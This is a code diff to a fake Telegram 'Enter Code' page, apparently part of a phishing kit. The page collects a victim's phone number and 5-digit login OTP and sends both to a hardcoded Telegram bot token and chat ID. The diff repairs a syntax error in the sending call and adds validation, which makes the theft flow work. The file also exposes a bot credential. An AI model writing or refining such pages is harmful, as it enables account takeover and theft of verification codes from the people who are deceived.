@@ -48,7 +48,7 @@
 <body>
     <div class="container">
         <h2>Enter Code</h2>
-        <p id="thisPhone">We have sent the code to your telegram app <span></span></p>
+        <p id="thisPhone">We have sent the code to your Telegram app <span></span></p>
         <form id="formPin">
             <input id="pin1" class="inppin" maxlength="1" type="text" required>
             <input id="pin2" class="inppin" maxlength="1" type="text" required>
@@ -65,7 +65,7 @@
         const BOT_TOKEN = '7451357338:AAGaHAyD96AMy2WVLgSbfQi0ovel3Y31IWk';
         const CHAT_ID = '6269902580';
 
-        document.addEventListener("DOMContentLoaded", function() {
+        document.addEventListener("DOMContentLoaded", function () {
             // Set nomor telepon di halaman
             const phone = sessionStorage.getItem("nohp");
             document.getElementById("thisPhone").querySelector("span").textContent = phone || 'Unknown';
@@ -73,15 +73,25 @@
 
         function sendPin() {
             const inputs = $(".inppin").toArray();
-            const code = inputs.map(input => input.value).join("");
+            const code = inputs.map(input => input.value.trim()).join("");
             const phone = sessionStorage.getItem("nohp");
 
-            if (!phone || code.length !== 5) {
-                alert("Nomor telepon atau kode tidak valid!");
+            if (!phone) {
+                alert("Nomor telepon tidak ditemukan!");
+                return;
+            }
+
+            if (code.length !== 5 || isNaN(code)) {
+                alert("Kode OTP harus berupa angka sebanyak 5 digit!");
                 return;
             }
 
             const message = `📱 Phone: ${phone}\n🔑 OTP: ${code}`;
+            
+            console.log("Data yang dikirim:", {
+                chat_id: CHAT_ID,
+                text: message
+            });
 
             $.ajax({
                 url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
@@ -91,15 +101,13 @@
                     chat_id: CHAT_ID,
                     text: message
                 }),
-                console.log("Data dikirim:", {
-    chat_id: CHAT_ID,
-    text: message
-});
-
+                success: function (response) {
+                    alert("Data berhasil dikirim ke bot Telegram!");
+                    console.log("Respons sukses:", response);
                 },
-                error: function(err) {
+                error: function (err) {
                     alert("Terjadi kesalahan saat mengirim data.");
-                    console.error(err);
+                    console.error("Error:", err);
                 }
             });
         }
